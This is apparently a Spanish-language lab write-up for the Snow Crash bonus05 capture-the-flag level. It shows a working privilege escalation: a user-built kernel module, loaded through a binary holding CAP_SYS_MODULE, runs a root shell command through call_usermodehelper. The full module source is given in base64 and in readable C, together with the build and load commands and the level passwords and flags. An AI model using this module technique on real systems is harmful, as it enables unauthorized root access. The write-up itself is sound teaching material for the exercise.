# Bonus05 — Snow Crash

> **Nivel bonus final** · Módulo de kernel · `CAP_SYS_MODULE` · Escalada privilegiada

| | |
|---|---|
| **Proyecto** | Snow Crash (42) |
| **Nivel** | `bonus05` |
| **Usuario de entrada** | `bonus05` |
| **Objetivo** | Credencial de `flagbonus05` |
| **Idea central** | Cargar un módulo `.ko` propio con un helper privilegiado |

---

<a id="indice"></a>

## 📋 Índice

1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
2. 🗺️ [Mapa mental del ataque](#sec-2)
3. 📖 [Glosario rápido](#sec-3)
4. 🏷️ [Tipo de ejercicio](#sec-4)
5. 🎯 [Objetivo](#sec-5)
6. 🔑 [Acceso al nivel](#sec-6)
7. 🔍 [Localizar el componente del nivel](#sec-7)
8. 📄 [Documentación del loader (`rife_loader.c`)](#sec-8)
9. ⚠️ [Intentos que fallan (y por qué)](#sec-9)
10. ✅ [Solución: `call_usermodehelper` en el `init` del módulo](#sec-10)
11. 🏁 [Credencial final](#sec-11)
12. ⌨️ [Resumen de comandos válidos](#sec-12)
13. 💡 [Conceptos importantes](#sec-13)
14. 📦 [Conclusión](#sec-14)
15. 📁 [Estructura recomendada en el repositorio](#sec-15)
16. 📚 [Para seguir aprendiendo](#sec-16)



> **Tip de navegación:** al final de cada sección encontrarás un enlace **Volver al índice** para saltar otra vez aquí sin hacer scroll.

---

<a id="sec-1"></a>

## 1. 🧭 ¿De qué va este nivel? (visión general)

Imagina un edificio con una **sala de máquinas** (el *kernel* del sistema
operativo). Normalmente solo el personal autorizado puede instalar allí
dispositivos nuevos. En este nivel hay una **llave especial** (`CAP_SYS_MODULE`)
que permite enganchar un aparato nuevo (un *módulo* `.ko`) sin ser el dueño
completo del edificio.

Si tú fabricas ese aparato, puedes programarlo para que, en el momento de
conectarlo, copie un documento secreto del despacho del jefe a un casillero
público del pasillo. Eso es, en esencia, bonus05:

1. Fabricas un módulo de kernel (código C → fichero `.ko`).
2. Lo “enchufas” con el programa `rife`, que tiene permiso para cargar módulos.
3. Al arrancar, el módulo pide al sistema que ejecute un comando **como root**.
4. Ese comando copia la flag a `/tmp/rife_flag`, donde tú sí puedes leerla.

No hace falta entender todo el kernel de Linux de antemano: basta con seguir
los pasos y, cuando aparezca un término nuevo, mirar el [glosario](#3--glosario-rápido).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-2"></a>

## 2. 🗺️ Mapa mental del ataque

```text
  [tú: bonus05]
        │
        │  1. escribes rife4.c  +  Makefile
        │  2. make → rife4.ko
        ▼
  ┌─────────────────────────────┐
  │ /opt/snowcrash/bonus05/rife │  ← tiene CAP_SYS_MODULE
  │ finit_module(rife4.ko)      │
  └─────────────┬───────────────┘
                │  3. el kernel acepta el módulo
                ▼
  ┌─────────────────────────────┐
  │  module_init() del .ko      │
  │  call_usermodehelper(...)   │  ← corre un shell como root
  │  cp .../.flag → /tmp/...    │
  └─────────────┬───────────────┘
                │  4. lees el resultado
                ▼
         /tmp/rife_flag
         (flag legible)
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-3"></a>

## 3. 📖 Glosario rápido

| Término | Analogía cotidiana | Qué es en la práctica |
|---------|-------------------|------------------------|
| **Kernel** | Sala de máquinas del edificio | Núcleo del SO: gestiona memoria, procesos, disco, red |
| **Módulo (`.ko`)** | Aparato enchufable en esa sala | Código que se carga en el kernel en caliente (`insmod` / `finit_module`) |
| **User space** | Oficinas de los empleados | Programas normales (`bash`, `cat`, tu shell SSH) |
| **Capability** | Llave de una sola habitación | Privilegio fino (p. ej. “solo cargar módulos”), no todo el poder de root |
| **`CAP_SYS_MODULE`** | Llave de la sala de máquinas | Permite insertar módulos sin ser root completo |
| **`/proc`** | Tablón de anuncios del kernel | Sistema de ficheros virtual donde el kernel expone información |
| **Flag / `.flag`** | Documento secreto del nivel | Cadena que sirve de contraseña del siguiente usuario o de prueba |
| **OVA / VM** | Casa de invitado ya montada | Máquina virtual del proyecto Snow Crash |
| **Base64** | Sobre que solo admite letras “seguras” | Codificación de bytes en texto ASCII (A–Z, a–z, 0–9, `+`, `/`) |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-4"></a>

## 4. 🏷️ Tipo de ejercicio

Carga de un **módulo de kernel** controlado por el atacante mediante un helper
con la capability **`CAP_SYS_MODULE`**, y obtención de la flag desde espacio de
kernel (lectura privilegiada del fichero de `flagbonus05`).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-5"></a>

## 5. 🎯 Objetivo

Obtener la credencial asociada a `flagbonus05` (último nivel bonus de esta OVA).

El binario `/opt/snowcrash/bonus05/rife` no es legible, pero es ejecutable y
tiene `cap_sys_module=ep`. Carga en el kernel el fichero `.ko` que se le pase
como argumento (`finit_module`). La plantilla del home describe un módulo que
expone datos en `/proc/rife`; en la práctica, la forma fiable de leer el
`.flag` en este entorno es un módulo que, al inicializarse, ejecuta un comando
como root con `call_usermodehelper`.

La pista del home de `bonus05` es:

```text
Rife owned the wire. All of it.
```

*(Referencia a L. Bob Rife en *Snow Crash*: control de la red / “el cable”.
En el nivel, “controlar el wire” se traduce en poder cargar código en el
kernel.)*

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-6"></a>

## 6. 🔑 Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus05@localhost -p 2424
```

La contraseña de `bonus05` es la flag de `bonus04`:

```text
oo0eoaiia5ei8oo9xasah2ihu
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus05
uid=3005(bonus05) gid=3005(bonus05) groups=3005(bonus05),1001(levelgroup)
/home/bonus05
```

```text
Rife owned the wire. All of it.
```

En el home aparece también la plantilla del módulo:

```text
-rw-r--r--  1 bonus05 bonus05 4500 ... rife_template.c
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-7"></a>

## 7. 🔍 Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus05
```

Resultado:

```text
/opt/snowcrash/bonus05:
-rwxr-xr-x  1 root root   263 ... load_rife.sh
-rwx--x--x  1 root root 16376 ... rife
-rw-r--r--  1 root root  2132 ... rife_loader.c
```

| Fichero | Rol |
|---------|-----|
| `rife` | Loader privilegiado (`finit_module`) |
| `load_rife.sh` | Wrapper: `exec /opt/snowcrash/bonus05/rife "$1"` |
| `rife_loader.c` | Código fuente documentado del loader |
| `~/rife_template.c` | Esqueleto de módulo kernel con TODO A/B |

Capabilities del loader:

```bash
getcap /opt/snowcrash/bonus05/rife
```

```text
/opt/snowcrash/bonus05/rife cap_sys_module=ep
```

**Cómo leer esa línea**

| Parte | Significado |
|-------|-------------|
| `cap_sys_module` | La capability de cargar módulos |
| `e` (*effective*) | Está activa cuando el programa corre |
| `p` (*permitted*) | Forma parte del conjunto permitido del binario |

`CAP_SYS_MODULE` permite insertar (y, en general, gestionar) módulos de kernel
sin ser root. El modo del binario es `711` (`-rwx--x--x`): se puede ejecutar,
pero no leer (por eso existe `rife_loader.c` como documentación).

Uso:

```bash
/opt/snowcrash/bonus05/rife
# usage: /opt/snowcrash/bonus05/rife <module.ko>
```

No hay servicio `systemd` propio de bonus05: el vector es el loader + un
`.ko` compilado por el usuario.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-8"></a>

## 8. 📄 Documentación del loader (`rife_loader.c`)

Fragmentos relevantes:

```c
/* finit_module(fd, param_values, flags) */
static int finit_module(int fd, const char *params, int flags)
{
    return (int)syscall(SYS_finit_module, fd, params, flags);
}

/* ... */
int fd = open(path, O_RDONLY | O_CLOEXEC);
...
if (finit_module(fd, "", 0) < 0) {
    fprintf(stderr, "rife: finit_module: %s\n", strerror(errno));
    ...
}
printf("rife: module loaded — cat /proc/rife\n");
```

Comentarios del propio fuente:

- Tras cargar el módulo, se espera poder leer la flag en **`/proc/rife`**.
- La capability se asigna con `setcap cap_sys_module+ep` sobre este binario.

La plantilla `rife_template.c` pide implementar:

- **TODO A:** callback `rife_proc_show` (escribir datos en el `seq_file`).
- **TODO B:** eliminar `/proc/rife` en el `exit` del módulo (`proc_remove`).

También registra `/proc/rife` en el `init` con `proc_create_single`. El array
`rife_data[]` de la plantilla está **vacío**, así que un `seq_puts` de esa
cadena no entrega la flag. Hace falta **leer** `/home/flagbonus05/.flag` con
privilegios de kernel/root.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-9"></a>

## 9. ⚠️ Intentos que fallan (y por qué)

### 9.1. `filp_open` del `.flag` en el callback de `/proc`

Al hacer `cat /proc/rife`, el callback del módulo se ejecuta con las
**credenciales del proceso lector** (`bonus05`). Entonces:

```c
f = filp_open("/home/flagbonus05/.flag", O_RDONLY, 0);
/* PTR_ERR(f) == -13  →  EACCES */
```

**Analogía:** el tablón `/proc/rife` está en el pasillo; cuando tú lo lees, el
sistema te mira a *ti* (empleado `bonus05`), no al técnico que instaló el
tablón. Si el documento secreto está en el despacho del jefe, con tu tarjeta
no entras.

`bonus05` no puede abrir ese fichero; el kernel aplica DAC con esas
credenciales.

### 9.2. `prepare_kernel_cred(NULL)` + `override_creds`

En muchos sistemas se usa para actuar temporalmente como credenciales de
kernel/root. En **esta** OVA, `prepare_kernel_cred(NULL)` devuelve **`NULL`**
(política / restricciones del kernel), y el módulo solo puede informar
`prepare_kernel_cred failed`.

### 9.3. Módulos ya cargados y sin `rmmod`

Una vez cargado un módulo defectuoso (`rife`, `rife2`, …), sin
`CAP_SYS_MODULE` en la shell el usuario **no** puede hacer `rmmod`. Un nuevo
`.ko` con el **mismo nombre de módulo** falla con:

```text
rife: finit_module: File exists
```

**Analogía:** ya hay un aparato llamado “rife2” enchufado; el sistema no deja
enchufar otro con el mismo nombre. Solución: fabricar uno nuevo con otro
nombre (`rife3`, `rife4`, …) y, si usas `/proc`, otra entrada
(`/proc/rife3`, …).

### 9.4. Heredocs rotos al pegar

Pegar bloques grandes con comillas anidadas en la sesión SSH corrompe a
menudo el fichero `.c` o el `Makefile` (`obj-m := rife4.o\n` literal). Para
este nivel es más seguro generar el fuente con **`base64 -d`** o un script
mínimo y verificar con `head` / `wc -l` antes de `make`.

*(La sección siguiente desarrolla *por qué* base64 y *cómo* usarlo.)*

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-10"></a>

## 10. ✅ Solución: `call_usermodehelper` en el `init` del módulo

`call_usermodehelper` lanza un proceso en espacio de usuario **con privilegios
de root** (contexto del helper de kernel). Desde el `module_init` se puede
copiar el `.flag` a un path legible por `bonus05`:

```text
cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag
```

**Analogía:** no intentas entrar tú al despacho del jefe. En cambio, en el
momento de instalar el aparato, dejas una instrucción automática para el
conserje del edificio (root): “haz una fotocopia del documento y déjala en el
casillero del pasillo”.

### 10.1. Crear el directorio de trabajo

```bash
mkdir -p ~/rife_build
cd ~/rife_build
```

### 10.2. Makefile

```bash
printf 'obj-m := rife4.o\n' > Makefile
cat Makefile
```

`obj-m := rife4.o` le dice al sistema de build del kernel: “compila un módulo
a partir de `rife4.c` y genera `rife4.ko`”.

### 10.3. Fuente del módulo (vía base64, sin heredoc frágil)

#### ¿Por qué no un `cat << 'EOF'` enorme?

Un *heredoc* es una forma cómoda de pegar texto multilínea en la shell.
En una sesión SSH real, al copiar desde el chat o el navegador, a menudo
ocurren problemas:

| Problema | Efecto |
|----------|--------|
| Comillas `"` / `'` mal escapadas | El `.c` queda a medias o con basura |
| La shell interpreta trozos del pegado | Se ejecutan comandos a mitad del archivo |
| Saltos de línea o caracteres invisibles | El compilador falla o el `Makefile` se rompe |
| Líneas del chat mezcladas con el código | El fuente ya no es C válido |

**Analogía:** es como dictar una receta larga por teléfono: si alguien
interrumpe a mitad, el pastel sale mal. Base64 es enviar la receta en un
código de letras que el receptor *decodifica* de golpe, sin interpretar nada
por el camino.

#### ¿Qué es Base64, en una frase?

Es una forma de escribir **cualquier secuencia de bytes** usando solo
caracteres “seguros” de texto (letras, números y unos pocos símbolos). Así el
bloque se puede pegar en un terminal sin que la shell lo confunda con
comandos.

- **Codificar:** bytes → texto Base64 (para transportar).
- **Decodificar:** texto Base64 → bytes originales (el `.c` de verdad).

#### Cómo se genera el Base64 (en el host o en cualquier Linux)

Si tienes el fichero `rife4.c` limpio:

```bash
base64 rife4.c
# o, en una sola línea sin saltos molestos:
base64 -w 0 rife4.c > rife4.c.b64
```

Para **recuperar** el fichero:

```bash
base64 -d > rife4.c << 'B64'
...pega aquí el bloque...
B64
```

O:

```bash
base64 -d rife4.c.b64 > rife4.c
```

**Qué ganamos**

1. El pegado es un bloque uniforme de A–Z / a–z / 0–9; casi no hay comillas.
2. `base64 -d` escribe el `.c` **binario/texto exacto** que codificamos.
3. Podemos comprobar integridad: `wc -l`, `head`, incluso `sha256sum`.
4. Evitamos el fallo típico del `Makefile` con un `\n` literal por un
   `printf`/`echo` mal pegado.

#### Comandos usados en la resolución

```bash
base64 -d > rife4.c << 'B64'
I2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgva2VybmVsLmg+CiNp
bmNsdWRlIDxsaW51eC9pbml0Lmg+CiNpbmNsdWRlIDxsaW51eC9rbW9kLmg+CgpNT0RVTEVf
TElDRU5TRSgiR1BMIik7Ck1PRFVMRV9BVVRIT1IoImJvbnVzMDUiKTsKTU9EVUxFX0RFU0NS
SVBUSU9OKCJSaWZlIHVtaCBoZWxwZXIiKTsKCnN0YXRpYyBpbnQgX19pbml0IHJpZmVfaW5p
dCh2b2lkKQp7CgljaGFyICphcmd2W10gPSB7CgkJIi9iaW4vc2giLAoJCSItYyIsCgkJImNw
IC9ob21lL2ZsYWdib251czA1Ly5mbGFnIC90bXAvcmlmZV9mbGFnICYmIGNobW9kIDY0NCAv
dG1wL3JpZmVfZmxhZyIsCgkJTlVMTAoJfTsKCWNoYXIgKmVudnBbXSA9IHsKCQkiSE9NRT0v
IiwKCQkiUEFUSD0vc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbiIsCgkJTlVMTAoJfTsK
CWludCByZXQgPSBjYWxsX3VzZXJtb2RlaGVscGVyKGFyZ3ZbMF0sIGFyZ3YsIGVudnAsIFVN
SF9XQUlUX1BST0MpOwoJcHJfaW5mbygicmlmZTQ6IHVtaCByZXQ9JWRcbiIsIHJldCk7Cgly
ZXR1cm4gMDsKfQoKc3RhdGljIHZvaWQgX19leGl0IHJpZmVfZXhpdCh2b2lkKQp7Cglwcl9p
bmZvKCJyaWZlNDogdW5sb2FkZWRcbiIpOwp9Cgptb2R1bGVfaW5pdChyaWZlX2luaXQpOwpt
b2R1bGVfZXhpdChyaWZlX2V4aXQpOwo=
B64

wc -l rife4.c
head -25 rife4.c
```

Tras decodificar, conviene **verificar** que el fuente es C coherente:

```bash
head -5 rife4.c
# debe empezar por: #include <linux/module.h>
grep -n call_usermodehelper rife4.c
```

#### Equivalente en C legible (el contenido real del `.c`)

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("bonus05");
MODULE_DESCRIPTION("Rife umh helper");

static int __init rife_init(void)
{
	char *argv[] = {
		"/bin/sh",
		"-c",
		"cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag",
		NULL
	};
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	pr_info("rife4: umh ret=%d\n", ret);
	return 0;
}

static void __exit rife_exit(void)
{
	pr_info("rife4: unloaded\n");
}

module_init(rife_init);
module_exit(rife_exit);
```

**Lectura guiada del código**

| Fragmento | Qué hace |
|-----------|----------|
| `MODULE_LICENSE("GPL")` | Declara licencia; facilita usar APIs del kernel marcadas como GPL |
| `rife_init` | Función que el kernel llama **al cargar** el módulo |
| `argv` / `envp` | Argumentos y entorno del proceso que se va a lanzar |
| `call_usermodehelper(..., UMH_WAIT_PROC)` | Lanza `/bin/sh -c "cp ..."` y **espera** a que termine |
| `module_init` / `module_exit` | Registran las funciones de carga y descarga |

### 10.4. Compilar y cargar

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
ls -la rife4.ko

/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
# mensaje: rife: module loaded — cat /proc/rife
```

**Qué significa el `make`**

- `-C /lib/modules/$(uname -r)/build` → usa las reglas e includes del kernel
  instalado (misma versión que la VM).
- `M=$(pwd)` → “compila el módulo que está en *este* directorio”.
- Resultado: `rife4.ko` (objeto de módulo cargable).

(El mensaje del loader menciona `/proc/rife` por el diseño original; en esta
solución la flag está en `/tmp/rife_flag`.)

### 10.5. Leer la flag

```bash
ls -la /tmp/rife_flag
cat /tmp/rife_flag
```

Salida obtenida:

```text
-rw-r--r-- 1 root root 26 ... /tmp/rife_flag
7oa2eihe3ohohzee5gob2aing
```

Propietario `root`: confirma que el `cp` lo hizo un proceso privilegiado, no
tu shell de `bonus05`.

### Secuencia

1. Se compila un `.ko` controlado por `bonus05`.
2. El loader con `CAP_SYS_MODULE` inserta el módulo en el kernel.
3. En `module_init`, `call_usermodehelper` ejecuta un `cp` como root.
4. Aparece `/tmp/rife_flag` con la credencial.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-11"></a>

## 11. 🏁 Credencial final

```text
7oa2eihe3ohohzee5gob2aing
```

Guardar en el repositorio:

```text
bonus05/flag
```

con una sola línea con esa cadena.

Con esto se cierra la parte **bonus** de la OVA (bonus01–bonus05).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-12"></a>

## 12. ⌨️ Resumen de comandos válidos

```bash
ssh bonus05@localhost -p 2424
ls -la
cat README
cat ~/rife_template.c
cat /opt/snowcrash/bonus05/rife_loader.c
getcap /opt/snowcrash/bonus05/rife

mkdir -p ~/rife_build && cd ~/rife_build
printf 'obj-m := rife4.o\n' > Makefile
# escribir rife4.c (base64 o editor) con call_usermodehelper → cp del .flag
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
cat /tmp/rife_flag
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-13"></a>

## 13. 💡 Conceptos importantes

- **`CAP_SYS_MODULE`**: capability que permite cargar módulos de kernel sin UID
  0 completo. Es un vector de escalada fuerte si el atacante puede suministrar
  el `.ko`.
- **`finit_module(2)`**: carga un módulo a partir de un descriptor de fichero
  abierto (el loader abre el `.ko` y llama al syscall).
- **Credenciales en callbacks de `/proc`**: el código del módulo que atiende
  una lectura de `/proc` suele ejecutarse en el contexto del proceso que lee;
  no hereda automáticamente privilegios de “root del módulo”.
- **`prepare_kernel_cred` / `override_creds`**: patrón habitual para elevar
  credenciales en kernel; puede estar limitado o devolver `NULL` según la
  configuración del sistema.
- **`call_usermodehelper`**: API del kernel para lanzar un binario en userland
  (típicamente como root). Útil cuando se puede ejecutar código en
  `module_init` y se necesita interactuar con el sistema de ficheros con
  privilegios altos.
- **Headers del kernel en la OVA**: `/lib/modules/$(uname -r)/build` debe
  apuntar a los headers instalados para poder compilar módulos fuera del árbol
  principal (`M=$(pwd)`).
- **Base64 como canal de transporte**: no es cifrado; solo codificación. Sirve
  para mover bytes por un medio que “entiende de texto” (chat, terminal, correo)
  sin que el medio los reinterpret.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-14"></a>

## 14. 📦 Conclusión

No hace falta modificar la OVA ni el loader. La solución consiste en:

1. Entender que `rife` carga cualquier `.ko` válido gracias a `CAP_SYS_MODULE`.
2. Compilar un módulo propio que en el `init` copie
   `/home/flagbonus05/.flag` a `/tmp/rife_flag` mediante
   `call_usermodehelper`.
3. Cargar el módulo con `/opt/snowcrash/bonus05/rife` y leer el fichero de
   salida.

Credencial obtenida:

```text
7oa2eihe3ohohzee5gob2aing
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-15"></a>

## 15. 📁 Estructura recomendada en el repositorio

```text
bonus05/
├── flag                          # 7oa2eihe3ohohzee5gob2aing
└── resources/
    └── bonus05.md                # este documento
```

Opcional: guardar una copia de `rife4.c` / `Makefile` en `resources/` para
reproducir el build.

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus05/resources/bonus05.md` y el token en `bonus05/flag`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-16"></a>

## 16. 📚 Para seguir aprendiendo

| Tema | Por dónde tirar |
|------|------------------|
| Módulos de kernel | `Documentation/` del árbol de Linux; ejemplos `proc_create_single` |
| Capabilities | `man capabilities`, `getcap` / `setcap` |
| Syscalls de módulos | `man 2 init_module`, `man 2 finit_module`, `man 2 delete_module` |
| Base64 | `man base64`; contraste con “cifrado” (Base64 **no** oculta secretos) |

Si vienes de los bonus anteriores: aquí el patrón “servicio que corre como
flagXX” se sustituye por “código que **tú** introduces en el kernel con una
capability concreta”. El hilo común es siempre el mismo: *¿quién tiene el
privilegio y cómo se le puede pedir que haga el trabajo por nosotros?*

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<div align="center">

**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**

*Snow Crash · bonus05 · material didáctico de resolución*

</div>
